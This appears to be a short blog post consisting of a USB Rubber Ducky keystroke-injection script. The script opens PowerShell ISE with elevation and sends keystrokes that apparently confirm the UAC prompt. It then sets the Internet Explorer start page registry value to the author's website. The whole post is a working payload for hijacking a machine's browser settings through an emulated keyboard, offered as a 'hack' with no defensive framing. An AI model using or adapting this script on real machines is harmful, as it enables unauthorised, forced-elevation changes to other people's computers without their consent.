# Registry Hack to set Internet Explorer Start Page
## Ducky scripts, PowerShell, Security 
### URL: https://www.jesusninoc.com/2015/01/16/registry-hack-set-internet-explorer-start-page/
```PowerShell
DELAY 750
GUI r
DELAY 750
STRING powershell Start-Process powershell_ise -Verb runAs
ENTER
DELAY 2050
ALT s
DELAY 2050
ENTER
CTRL R
ENTER
CTRL I
STRING cd HKLM:\
ENTER
STRING $RegKey ='HKCU:\Software\Microsoft\Internet Explorer\Main\'
ENTER
STRING Set-ItemProperty -Path $RegKey -Name 'Start Page' -Value 'https://www.jesusninoc.com/'
ENTER
DELAY 2050
F5

```
